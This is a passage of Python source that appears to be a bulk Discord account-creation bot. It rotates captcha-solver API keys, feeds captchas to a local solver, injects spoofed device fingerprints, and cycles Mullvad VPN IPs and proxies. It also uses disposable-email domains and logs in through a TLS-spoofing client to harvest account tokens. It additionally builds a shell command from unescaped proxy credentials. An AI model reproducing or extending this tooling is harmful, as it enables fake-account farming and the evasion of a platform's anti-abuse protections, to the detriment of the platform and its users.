import asyncio
from datetime import datetime
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import threading
import time
import json
import random
import string
import signal
import tempfile
from typing import Optional, Dict
import requests
import httpx
import tls_client
from colorama import Fore, Style, init
from pystyle import Center
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.table import Table
from rich.text import Text
from collections import deque
import warnings
import nodriver as uc
from nodriver import cdp
import urllib3
import base64
import logging
import imaplib
import email as email_module
from email.header import decode_header
import psutil

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

async def cdpkey(tab, key: str, code: str, keycode: int):
    try:
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyDown", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
        await asyncio.sleep(0.05)
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyUp", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
    except Exception:
        pass

def getbravepath() -> Optional[str]:
    paths = [
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
        "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
        "/usr/bin/brave-browser",
        "/usr/bin/brave",
        "/snap/bin/brave",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

bravepath = getbravepath()

if bravepath:
    pass
else:
    print("\033[93m[WARN]\033[0m Brave not found — falling back to default Chrome")

nopechaextdir = Path(__file__).parent / "nopecha_ext"
nopechakeysfile = Path(__file__).parent / "nopecha_keys.txt"
nopechakeyindex = 0
nopechakeylock = threading.Lock()

def loadnopechakeys() -> list:
    if not nopechakeysfile.exists():
        nopechakeysfile.write_text(
            "# Add your NopeCHA API keys here, one per line\n"
            "# Get keys from https://nopecha.com/setup\n"
        )
        return []
    keys = []
    for line in nopechakeysfile.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            keys.append(line)
    return keys

def getcurrentnopechakey() -> Optional[str]:
    try:
        if isinstance(config, dict):
            nopecha_config = config.get("nopecha", {})
            if nopecha_config.get("enabled", False) and nopecha_config.get("api_key"):
                key = nopecha_config.get("api_key")
                if key and key != "YOUR_NOPECHA_API_KEY_HERE":
                    return key
    except Exception:
        pass
    
    keys = loadnopechakeys()
    if not keys:
        return None
    with nopechakeylock:
        return keys[nopechakeyindex % len(keys)]

def rotatenopechakey():
    global nopechakeyindex
    keys = loadnopechakeys()
    if keys:
        with nopechakeylock:
            nopechakeyindex = (nopechakeyindex + 1) % len(keys)

def injectnopechakey(api_key: str) -> bool:
    if not api_key or not nopechaextdir.exists():
        return False
    
    try:
        manifest_path = nopechaextdir / "manifest.json"
        if manifest_path.exists():
            with open(manifest_path, 'r') as f:
                manifest = json.load(f)
            if 'nopecha' not in manifest:
                manifest['nopecha'] = {}
            manifest['nopecha']['key'] = api_key
            with open(manifest_path, 'w') as f:
                json.dump(manifest, f, indent=2)
        
        storage_init_path = nopechaextdir / "storage_init.js"
        storage_init_code = f"""
(function() {{
  const nopecha_api_key = '{api_key}';
  chrome.storage.local.set({{'nopecha_key': nopecha_api_key}}, function() {{
    console.log('[NopeCHA Storage] API Key initialized');
  }});
}})();
"""
        with open(storage_init_path, 'w') as f:
            f.write(storage_init_code)
        
        config_path = nopechaextdir / "nopecha_config.json"
        config_data = {
            'api_key': api_key,
            'enabled': True,
            'timestamp': datetime.now().isoformat()
        }
        with open(config_path, 'w') as f:
            json.dump(config_data, f, indent=2)
        
        return True
    except Exception as e:
        log.warning(f"Inject failed: {e}")
        return False

def downloadnopechaext() -> Optional[Path]:
    if nopechaextdir.exists() and (nopechaextdir / "manifest.json").exists():
        return nopechaextdir
    import zipfile, io
    zip_url = "https://github.com/NopeCHALLC/nopecha-extension/releases/latest/download/chromium_automation.zip"
    try:
        r = requests.get(zip_url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code != 200:
            log.warning(f"NopeCHA download failed: HTTP {r.status_code}")
            return None
        nopechaextdir.mkdir(exist_ok=True)
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            z.extractall(nopechaextdir)
        log.success("NopeCHA extension downloaded!")
        return nopechaextdir
    except Exception as e:
        log.warning(f"NopeCHA download error: {e}")
        return None

fingerprintsfile = Path(__file__).parent / "input/fingerprints.txt"
fingerprintsindex = 0
fingerprintslock = threading.Lock()
reservedfingerprints = set()

def loadfingerprints() -> list:
    if not fingerprintsfile.exists():
        fingerprintsfile.write_text(
            "# Add your fingerprints here, one per line\n"
            "# Each fingerprint will be assigned to one account\n"
        )
        return []
    fingerprints = []
    for line in fingerprintsfile.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            fingerprints.append(line)
    return fingerprints

def parsefingerprintline(line: str) -> Dict:
    if not line:
        return {}
    line = line.strip()
    if not line:
        return {}
    try:
        data = json.loads(line)
        if isinstance(data, dict):
            fingerprint = data.get('fingerprint') or data.get('metadata', {}).get('fingerprint')
            if fingerprint:
                data['fingerprint'] = fingerprint
            return data
    except json.JSONDecodeError:
        pass
    return {
        'fingerprint': line,
        'metadata': {
            'fingerprint': line
        }
    }

def getfingerprintvalue(fingerprint_line: str) -> Optional[str]:
    data = parsefingerprintline(fingerprint_line)
    return data.get('fingerprint')

def getfingerprintinstallationid(fingerprint_line: str) -> Optional[str]:
    data = parsefingerprintline(fingerprint_line)
    installation = data.get('installation') or data.get('metadata', {}).get('installation')
    return installation

def getcurrentfingerprint() -> Optional[str]:
    fingerprints = loadfingerprints()
    if not fingerprints:
        return None
    with fingerprintslock:
        return fingerprints[fingerprintsindex % len(fingerprints)]

def reservefingerprint() -> Optional[str]:
    with fingerprintslock:
        fingerprints = [f for f in loadfingerprints() if f not in reservedfingerprints]
        if not fingerprints:
            return None
        fingerprint = fingerprints[0]
        reservedfingerprints.add(fingerprint)
        return fingerprint

def releasefingerprint(fingerprint: str):
    if not fingerprint:
        return
    with fingerprintslock:
        reservedfingerprints.discard(fingerprint)

def consumefingerprint(fingerprint: str):
    if not fingerprint:
        return
    with fingerprintslock:
        lines = []
        for line in fingerprintsfile.read_text().splitlines():
            stripped = line.strip()
            if stripped and not stripped.startswith('#') and stripped != fingerprint:
                lines.append(line)
        fingerprintsfile.write_text("\n".join(lines) + ("\n" if lines else ""))
        reservedfingerprints.discard(fingerprint)

def rotatefingerprint():
    global fingerprintsindex
    fingerprints = loadfingerprints()
    if fingerprints:
        with fingerprintslock:
            fingerprintsindex = (fingerprintsindex + 1) % len(fingerprints)

def getfingerprintinstallationnumber(fingerprint: str) -> Optional[int]:
    if not fingerprint:
        return None
    fingerprints = loadfingerprints()
    for idx, fp in enumerate(fingerprints, start=1):
        if fp == fingerprint:
            return idx
    return None

async def injectfingerprinttopage(page, fingerprint_line: str) -> bool:
    data = parsefingerprintline(fingerprint_line)
    fingerprint_value = data.get('fingerprint')
    if not fingerprint_value:
        return False
    installation_value = data.get('installation') or data.get('metadata', {}).get('installation')
    json_data = json.dumps(data)
    js = f'''
    (() => {{
        try {{
            window.__discord_fp_data = {json_data};
            window.localStorage.setItem('discord_fp_data', JSON.stringify({json_data}));
            window.localStorage.setItem('discord_fingerprint', {json.dumps(fingerprint_value)});
            if ({json.dumps(bool(installation_value))}) {{
                window.localStorage.setItem('discord_installation_id', {json.dumps(installation_value)});
            }}
            return true;
        }} catch (e) {{
            return false;
        }}
    }})();
    '''
    try:
        return await page.evaluate(js)
    except Exception:
        return False

import subprocess
import psutil

mullvadstats = {
    'total_rotations': 0,
    'failed_rotations': 0,
    'ip_changes': 0,
    'last_ip': None,
    'last_rotation_time': None,
}

accountstats = {
    'valid': 0,
    'invalid': 0,
    'locked': 0,
}
accountstatslock = threading.Lock()

def checkmullvadinstalled() -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False

def mullvadkillstuckprocess(timeout: int = 30):
    try:
        for proc in psutil.process_iter(['pid', 'name', 'create_time']):
            try:
                if 'mullvad' in proc.info['name'].lower():
                    runtime = time.time() - proc.info['create_time']
                    if runtime > timeout:
                        proc.kill()
                        log.warning(f"Killed stuck mullvad process (PID: {proc.pid})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception:
        pass

def mullvadstatus(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            ['mullvad', 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        status = result.stdout.strip()
        status = re.sub(r'Visible location:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'IPv4:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'\s{2,}', ' ', status).strip()
        return status
    except subprocess.TimeoutExpired:
        log.warning("mullvad status command timed out")
        mullvadkillstuckprocess()
        return "timeout"
    except Exception:
        return "unknown"

def mullvaddisconnect(timeout: int = 15, max_attempts: int = 15):
    try:
        subprocess.run(
            ['mullvad', 'disconnect'],
            capture_output=True, text=True, timeout=10
        )
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvadstatus(timeout=5)
            if "Disconnected" in status:
                log.info("Mullvad disconnected successfully")
                return
            time.sleep(0.5)
            attempts += 1
        
        if attempts >= max_attempts:
            log.warning(f"Disconnect verification timed out after {attempts} attempts")
    except Exception as e:
        log.warning(f"Mullvad disconnect error: {e}")
        mullvadkillstuckprocess()

def mullvadconnect(country: str = "us", timeout: int = 30, max_attempts: int = 30) -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'relay', 'set', 'location', country],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log.warning(f"Failed to set Mullvad location to {country}")
            return False

        subprocess.run(
            ['mullvad', 'relay', 'set', 'tunnel-protocol', 'wireguard'],
            capture_output=True, text=True, timeout=10
        )

        subprocess.run(
            ['mullvad', 'connect'],
            capture_output=True, text=True, timeout=10
        )

        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvadstatus(timeout=5)
            
            if "Connected" in status:
                log.success(f"Mullvad connected to {country}")
                return True
            
            if "Connecting" in status or "Connecting" in status:
                wait_time = 0.5 if attempts < 5 else 1.0
                time.sleep(wait_time)
            else:
                log.debug(f"Mullvad status: {status}")
                time.sleep(1)
            
            attempts += 1
        
        final_status = mullvadstatus(timeout=5)
        log.error(f"Mullvad connection timeout. Final status: {final_status}")
        return False
        
    except subprocess.TimeoutExpired as e:
        log.error(f"Mullvad command timed out: {e}")
        mullvadkillstuckprocess()
        return False
    except Exception as e:
        log.error(f"Mullvad connect error: {e}")
        return False

def mullvadgetip(timeout: int = 15, attempts: int = 3) -> Optional[str]:
    providers = [
        ('https://am.i.mullvad.net/json', 'ip'),
        ('https://api.ipify.org?format=json', 'ip'),
        ('https://ifconfig.me/all.json', 'ip_addr'),
    ]
    
    for attempt in range(attempts):
        for url, key in providers:
            try:
                resp = requests.get(url, timeout=timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    ip = data.get(key, data.get('ip', None))
                    if ip:
                        return ip
            except Exception:
                continue
        
        if attempt < attempts - 1:
            time.sleep(1)
    
    return None

def loadmullvadaccounts() -> list:
    account_file = config.get("mullvad", {}).get("account_file", "input/mullvad_accounts.txt")
    account_path = Path(account_file)
    if not account_path.is_absolute():
        account_path = Path(__file__).parent / account_path

    if not account_path.exists():
        account_path.parent.mkdir(parents=True, exist_ok=True)
        account_path.write_text(
            "# Add your Mullvad account numbers here, one per line\n"
            "# The most recent account should be last\n"
        )
        return []

    accounts = []
    for line in account_path.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            accounts.append(line)
    return accounts

def getrecentmullvadaccount() -> Optional[str]:
    account_number = config.get("mullvad", {}).get("account_number", "")
    if isinstance(account_number, str) and account_number.strip():
        return account_number.strip()

    accounts = loadmullvadaccounts()
    if not accounts:
        return None
    return accounts[-1]

def mullvadaccountstatus(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            ['mullvad', 'account', 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode != 0:
            return (result.stderr or result.stdout or '').strip()
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "timeout"
    except Exception:
        return ""

def ismullvaddevicerevoked(status: str) -> bool:
    if not status:
        return False
    lowered = status.lower()
    revoked_keywords = ['revoked', 'revocation', 'expired', 'inactive', 'deactivated', 'invalid device', 'device revoked', 'device disabled']
    return any(keyword in lowered for keyword in revoked_keywords)

def mullvadaccountlogin(account: str, timeout: int = 30) -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'account', 'login', account],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode == 0:
            return True
        return False
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False

def mullvadautologinrecentaccount() -> bool:
    account = getrecentmullvadaccount()
    if not account:
        log.warning("No Mullvad account configured for auto-login")
        return True

    status = mullvadaccountstatus()
    if ismullvaddevicerevoked(status):
        log.warning("Mullvad device has been revoked; skipping auto-login for the recent account")
        return False

    if mullvadaccountlogin(account):
        log.success("Mullvad auto-login succeeded for recent account")
        return True

    log.warning("Mullvad auto-login failed for recent account")
    return False

def get_mullvad_country(config: dict) -> str:
    """
    Return a random country from:
      - 'countries' list (preferred)
      - 'country' list (if countries missing)
      - 'country' string (fallback)
    Defaults to 'us' if nothing works.
    """
    mullvad_cfg = config.get("mullvad", {})
    # 1. Check for "countries" list
    countries = mullvad_cfg.get("countries")
    if isinstance(countries, list) and countries:
        return random.choice(countries)
    # 2. Check for "country" which could be a list or a string
    country = mullvad_cfg.get("country")
    if isinstance(country, list) and country:
        return random.choice(country)
    if isinstance(country, str) and country:
        return country
    # 3. fallback
    return "us"

def mullvadrotate(country: str = "us", max_retries: int = 3, min_rotation_delay: int = 2) -> bool:
    mullvadstats['total_rotations'] += 1
    
    if mullvadstats['last_rotation_time']:
        elapsed = time.time() - mullvadstats['last_rotation_time']
        if elapsed < min_rotation_delay:
            time.sleep(min_rotation_delay - elapsed)
    
    old_ip = mullvadstats['last_ip']
    
    for attempt in range(max_retries):
        try:
            mullvaddisconnect(timeout=15)
            time.sleep(1)
            
            if not mullvadconnect(country, timeout=30):
                if config.get("mullvad", {}).get("auto_login", False):
                    status = mullvadaccountstatus()
                    if ismullvaddevicerevoked(status):
                        log.warning("Detected revoked Mullvad device during rotation; attempting auto-login...")
                        if mullvadautologinrecentaccount():
                            time.sleep(1)
                            continue
                        else:
                            log.error("Mullvad auto-login failed after revoked device detection")
                            mullvadstats['failed_rotations'] += 1
                            return False

                if attempt < max_retries - 1:
                    log.warning(f"Rotation attempt {attempt + 1}/{max_retries} failed, retrying...")
                    time.sleep(2 ** attempt)
                    continue
                else:
                    log.error("Mullvad rotation failed after all retries")
                    mullvadstats['failed_rotations'] += 1
                    return False
            
            time.sleep(1)
            new_ip = mullvadgetip(timeout=15)
            
            if new_ip:
                mullvadstats['last_ip'] = new_ip
                mullvadstats['last_rotation_time'] = time.time()
                
                if old_ip and new_ip == old_ip:
                    log.warning(f"IP did not change: {log.maskip(new_ip)} (retry {attempt + 1}/{max_retries})")
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        mullvaddisconnect()
                        continue
                    else:
                        mullvadstats['failed_rotations'] += 1
                        return False
                else:
                    if old_ip:
                        log.success(f"IP rotated: {log.maskip(old_ip)} → {log.maskip(new_ip)}")
                    else:
                        log.success(f"VPN connected — IP: {log.maskip(new_ip)}")
                    mullvadstats['ip_changes'] += 1
                    return True
            else:
                log.warning(f"Could not verify IP (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                else:
                    mullvadstats['failed_rotations'] += 1
                    return False
        
        except Exception as e:
            log.error(f"Rotation error: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
            else:
                mullvadstats['failed_rotations'] += 1
                return False
    
    return False

mullvadavailable = False

def getmullvadstats() -> dict:
    stats = mullvadstats.copy()
    if stats['total_rotations'] > 0:
        stats['success_rate'] = f"{((stats['total_rotations'] - stats['failed_rotations']) / stats['total_rotations'] * 100):.1f}%"
    return stats

def getaccountstats() -> dict:
    with accountstatslock:
        stats = accountstats.copy()
    total = stats['valid'] + stats['invalid'] + stats['locked']
    if total > 0:
        stats['valid_percent'] = f"{(stats['valid'] / total * 100):.1f}%"
        stats['total'] = total
    else:
        stats['valid_percent'] = "0.0%"
        stats['total'] = 0
    return stats

def parseproxy(proxy_string: str) -> Optional[Dict]:
    if not proxy_string:
        return None
    proxy_string = proxy_string.strip()
    if '://' not in proxy_string:
        proxy_string = 'socks5://' + proxy_string
    try:
        from urllib.parse import urlparse
        parsed = urlparse(proxy_string)
        proxy_type = parsed.scheme.lower()
        host = parsed.hostname
        port = parsed.port
        username = parsed.username
        password = parsed.password
        if not host or not port:
            return None
        if username and password:
            proxy_url_no_creds = f"{proxy_type}://{host}:{port}"
        else:
            proxy_url_no_creds = proxy_string
        full_url = proxy_string
        masked_url = proxy_string
        if username and password:
            masked_url = f"{proxy_type}://{username}:***@{host}:{port}"
        return {
            'type': proxy_type,
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'full_url': full_url,
            'proxy_url_no_creds': proxy_url_no_creds,
            'masked_url': masked_url,
        }
    except Exception:
        return None

def getbrowserproxyargs(proxy_config: Dict) -> list:
    args = []
    if not proxy_config:
        return args
    proxy_url = proxy_config.get('proxy_url_no_creds') or proxy_config.get('full_url')
    if proxy_url:
        args.append(f'--proxy-server={proxy_url}')
        args.append('--proxy-bypass-list=<-loopback>')
    return args

def getsessionproxy(proxy_config: Dict) -> Optional[Dict]:
    if not proxy_config:
        return None
    full_url = proxy_config.get('full_url')
    if full_url:
        return {'http': full_url, 'https': full_url}
    return None

def loadproxies(config: dict) -> list:
    proxy_config = config.get("proxy", {})
    if not proxy_config.get("enabled", False):
        return []
    proxy_file = proxy_config.get("file", "input/proxies.txt")
    proxy_path = Path(proxy_file)
    if not proxy_path.exists():
        log.warning(f"Proxy file not found: {proxy_file}")
        return []
    try:
        proxies = []
        with open(proxy_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parsed = parseproxy(line)
                    if parsed:
                        proxies.append(parsed)
        if proxies:
            log.success(f"Loaded {len(proxies)} proxies")
            return proxies
    except Exception as e:
        log.error(f"Error loading proxies: {e}")
    return []

async def setupproxyauth(browser, proxy_config: Dict):
    if not proxy_config or not proxy_config.get('username') or not proxy_config.get('password'):
        return
    
    username = proxy_config.get('username', '')
    password = proxy_config.get('password', '')
    
    try:
        import pyautogui
        import subprocess
        
        async def autofillproxyauth():
            max_wait = 60
            max_retries = 10
            dialog_found = False
            
            for wait_attempt in range(max_wait * 2):
                try:
                    await asyncio.sleep(0.5)
                    
                    try:
                        page = await browser.get_page()
                        if page:
                            result = await asyncio.wait_for(page.evaluate("1"), timeout=1)
                            if dialog_found:
                                log.success("Proxy authenticated successfully")
                            return
                    except Exception:
                        if not dialog_found:
                            log.info("Proxy auth dialog detected, submitting credentials...")
                            dialog_found = True
                        
                        retry_count = 0
                        while retry_count < max_retries:
                            try:
                                log.info(f"Submitting proxy auth (attempt {retry_count + 1}/{max_retries})...")
                                
                                pyautogui.press('escape')
                                await asyncio.sleep(0.1)
                                
                                pyautogui.press('tab')
                                await asyncio.sleep(0.15)
                                
                                pyautogui.hotkey('ctrl', 'a')
                                await asyncio.sleep(0.1)
                                
                                cmd = f'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::SetText(\'{username}\')"'
                                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                                await asyncio.sleep(0.1)
                                pyautogui.hotkey('ctrl', 'v')
                                await asyncio.sleep(0.3)
                                
                                pyautogui.press('tab')
                                await asyncio.sleep(0.15)
                                
                                pyautogui.hotkey('ctrl', 'a')
                                await asyncio.sleep(0.1)
                                
                                cmd = f'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::SetText(\'{password}\')"'
                                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                                await asyncio.sleep(0.1)
                                pyautogui.hotkey('ctrl', 'v')
                                await asyncio.sleep(0.3)
                                
                                pyautogui.press('enter')
                                await asyncio.sleep(2)
                                
                                try:
                                    page = await browser.get_page()
                                    if page:
                                        result = await asyncio.wait_for(page.evaluate("1"), timeout=1)
                                        log.success("Proxy authenticated successfully")
                                        return
                                except Exception:
                                    retry_count += 1
                                    if retry_count < max_retries:
                                        log.debug(f"Auth dialog still present, retrying...")
                                        await asyncio.sleep(0.5)
                                    
                            except Exception as e:
                                log.debug(f"Auth submission error: {e}")
                                retry_count += 1
                                await asyncio.sleep(0.5)
                        
                        if retry_count >= max_retries:
                            log.warning(f"Could not submit proxy auth after {max_retries} attempts")
                            return
                        
                except Exception as e:
                    log.debug(f"Auth monitor error: {e}")
                    await asyncio.sleep(0.5)
        
        asyncio.create_task(autofillproxyauth())
        
    except Exception as e:
        log.debug(f"Proxy auth setup: {e}")

proxylist = []
proxylistlock = threading.Lock()

def getrandomproxy() -> Optional[Dict]:
    with proxylistlock:
        if not proxylist:
            return None
        return random.choice(proxylist)

async def fetchdiscordtoken(email: str, password: str, proxy_config: Dict = None) -> str:
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    payload = {"login": email, "password": password}
    session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
    if proxy_config:
        proxy_dict = getsessionproxy(proxy_config)
        if proxy_dict:
            session.proxies = proxy_dict
    try:
        response = session.post(url, headers=headers, json=payload)
        if response.status_code != 200:
            return ""
        return response.json().get("token", "")
    except:
        return ""

solverurl = "http://127.0.0.1:5003"
solvertimeout = 120

def sendcaptchatosolver(task_id: str, page_url: str = "https://discord.com/register", captcha_type: str = "unknown") -> Optional[str]:
    try:
        payload = {
            'task_id': task_id,
            'type': captcha_type,
            'page_url': page_url
        }
        
        response = requests.post(f'{solverurl}/api/solve', json=payload, timeout=5)
        if response.status_code not in [200, 202]:
            log.warning(f"Solver queue failed: {response.status_code}")
            return None
        
        log.info(f"Captcha task {task_id} sent to solver")
        
        start_time = time.time()
        poll_interval = 2
        while time.time() - start_time < solvertimeout:
            try:
                result_response = requests.get(f'{solverurl}/api/result/{task_id}', timeout=5)
                
                if result_response.status_code == 200:
                    data = result_response.json()
                    if data.get('status') == 'completed':
                        token = data.get('token')
                        log.success(f"Captcha solved: {task_id}")
                        return token
            except:
                pass
            
            time.sleep(poll_interval)
        
        log.warning(f"Solver timeout for {task_id}")
        return None
    
    except Exception as e:
        log.error(f"Solver integration error: {e}")
        return None

def checksolverhealth() -> bool:
    try:
        response = requests.get(f'{solverurl}/api/status', timeout=5)
        return response.status_code == 200
    except:
        return False

jsutils = '''
(() => {
    if (window.utils) return;
    
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) {
            el.value = value;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
        }
    }
    
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        let clicked = 0;
        checkboxes.forEach(cb => {
            if (!cb.checked) {
                cb.click();
                cb.checked = true;
                clicked++;
            }
        });
        return { clicked: clicked, total: checkboxes.length };
    }
    
    function clickElement(selector) {
        const el = document.querySelector(selector);
        if (el) el.click();
    }
    
    window.utils = {
        setInput,
        clickAllCheckboxes,
        clickElement,
    };
})();
'''

lock = threading.Lock()
sessiontarget = 0
sessioncreated = 0
sessionstop = False
activeworkers = 0
workerlock = threading.Lock()
starttime = time.time()
cooldownseconds = 60

configdir = Path('input')
configpath = configdir / 'config.json'
outputdir = Path('output')
outputdir.mkdir(exist_ok=True)

def loadorcreateconfig():
    if not configpath.exists():
        configdir.mkdir(exist_ok=True)
        template_config = {
            "threads": 1,
            "cooldown": 91,
            "provider_selection": "swiftmail",
            "email_providers": {
                "swiftmail": {
                    "enabled": True,
                    "api_key": "YOUR_SWIFTMAIL_API_KEY_HERE",
                    "api_base": "https://api.swiftinbox.xyz",
                    "domains": [
                        "homettown.online",
                        "swiftinbox1.store",
                        "mimuxyz.xyz",
                        "supporttown.shop",
                        "outlookinboxcc.shop",
                        "zazawin.fun",
                        "netonline.fun",
                        "onlinecc.site",
                        "zazamail.site"
                    ],
                    "description": "SwiftMail - disposable inboxes via SwiftMail API"
                }
            },
            "proxy": {"enabled": False, "file": "input/proxies.txt"},
            "mullvad": {
                "enabled": False,
                "countries": ["us", "nl", "jp", "de"],   # list of countries to rotate
                "country": "us",                         # fallback (single string)
                "auto_login": False,
                "account_number": ""
            },
            "nopecha": {"enabled": True, "api_key": "YOUR_NOPECHA_API_KEY"}
        }
        with open(configpath, 'w', encoding='utf-8') as f:
            json.dump(template_config, f, indent=4)
        print(f"\n\033[93m[CONFIG]\033[0m Config created at: {configpath}")
        sys.exit(0)
    try:
        with open(configpath, 'r', encoding='utf-8') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"\n\033[91m[ERROR]\033[0m Invalid JSON in config file: {configpath}")
        print(f"  {e}")
        print("Please fix the JSON syntax (remove trailing commas, etc.) and try again.")
        sys.exit(1)

config = loadorcreateconfig()
threadcount = config.get("threads", 1)
cooldownseconds = config.get("cooldown", 10)

mullvad_config = config.get("mullvad", {})
if mullvad_config.get("enabled", False):
    if checkmullvadinstalled():
        mullvadavailable = True
        threadcount = 1
        # Log the available countries
        countries = mullvad_config.get("countries") or mullvad_config.get("country")
        if isinstance(countries, list) and countries:
            print(f"\033[92m[INFO]\033[0m Mullvad VPN enabled (countries: {', '.join(countries)})")
        elif isinstance(countries, str) and countries:
            print(f"\033[92m[INFO]\033[0m Mullvad VPN enabled (country: {countries})")
        else:
            print(f"\033[92m[INFO]\033[0m Mullvad VPN enabled (default fallback: us)")
    else:
        print("\033[91m[ERROR]\033[0m Mullvad CLI not found! Install Mullvad VPN or disable it in config.")
        sys.exit(1)

if sys.platform == 'win32':
    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

gray = '\033[90m'
green = '\033[92m'
cyan = '\033[96m'
red = '\033[91m'
yellow = '\033[93m'
white = '\033[97m'
reset = '\033[0m'
blue = '\033[94m'
purple = '\033[95m'
magenta = '\033[95m'
orange = '\033[38;5;208m'
soft = '\033[38;2;180;180;220m'

class Logger:
    def __init__(self):
        self._lock = threading.Lock()
        self._buffer = deque(maxlen=1000)

    def _richemit(self, tag: str, message: str):
        try:
            console_ui = globals().get('console_ui')
            if not console_ui or not getattr(console_ui, 'console', None):
                return
            ts = datetime.now().strftime('%H:%M')
            color_map = {
                'DEBUG': 'white',
                'WARNING': 'bold yellow',
                'ERROR': 'bold red',
                'SUCCESS': 'bold green',
                'INFO': 'bold cyan',
                'SOLVED': 'bold magenta',
                'SOFT': 'rgb(180,180,220)'
            }
            tag_labels = {
                'WARNING': 'WAR',
                'ERROR': 'ERR',
                'SUCCESS': 'SUC',
                'INFO': 'INF',
                'SOLVED': 'SOL',
                'SOFT': 'SOF'
            }
            tag_label = tag_labels.get(tag, tag[:3].upper())
            tag_style = color_map.get(tag, 'white')
            text = Text()
            text.append(f"[{ts}] ", style="dim")
            text.append(f"{tag_label}", style=tag_style)
            text.append(" > ", style="dim")
            clean = re.sub(r'\x1b\[[0-9;]*m', '', message)
            text.append(self._richgradienttext(clean))
            console_ui.console.print(text, overflow='ellipsis')
        except Exception:
            pass

    def _printinline(self, emoji: str, tag: str, tag_color: str, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            icons = {'DEBUG':'D','WARNING':'!','ERROR':'✖','SUCCESS':'✓','INFO':'i','SOFT':'·'}
            icon = icons.get(tag.strip(), '')
            gradient_message = self._gradientize(message)
            line = f"{gray}[{ts}]{reset} {tag_color}{icon} {tag:<8}{reset} {gray}│{reset} {gradient_message}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, tag.strip(), message))
            except Exception:
                pass
            try:
                self._richemit(tag.strip(), message)
            except Exception:
                pass

    def _gradientize(self, message: str) -> str:
        if not message:
            return message
        stops = [
            (148, 0, 211),
            (75, 0, 130),
            (0, 128, 255),
            (0, 255, 200),
            (255, 255, 255)
        ]
        n = len(message)
        gradient_text = ""
        for i, ch in enumerate(message):
            if ch == '\n':
                gradient_text += ch
                continue
            t = i / (n - 1) if n > 1 else 0
            pos = t * (len(stops) - 1)
            idx = int(pos)
            frac = pos - idx
            r1, g1, b1 = stops[idx]
            r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
            r = int(r1 + (r2 - r1) * frac)
            g = int(g1 + (g2 - g1) * frac)
            b = int(b1 + (b2 - b1) * frac)
            gradient_text += f"\033[38;2;{r};{g};{b}m{ch}"
        return gradient_text

    def _richgradienttext(self, message: str) -> Text:
        text = Text()
        if not message:
            return text
        stops = [
            (148, 0, 211),
            (75, 0, 130),
            (0, 128, 255),
